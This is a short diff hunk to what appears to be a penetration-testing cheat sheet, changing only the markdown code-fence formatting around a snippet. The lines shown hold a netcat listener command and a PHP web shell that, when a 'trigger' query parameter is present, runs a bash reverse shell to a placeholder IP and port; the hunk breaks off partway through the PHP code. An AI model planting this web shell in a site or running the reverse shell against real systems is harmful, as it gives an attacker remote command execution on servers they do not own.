@@ -49,7 +49,9 @@
 Listen: nc -lvnp [PORT]
 
 PHP Shell (Trigger)
-```<?php
+
+```
+<?php
 
 if (isset($_GET['trigger'])) {
     exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
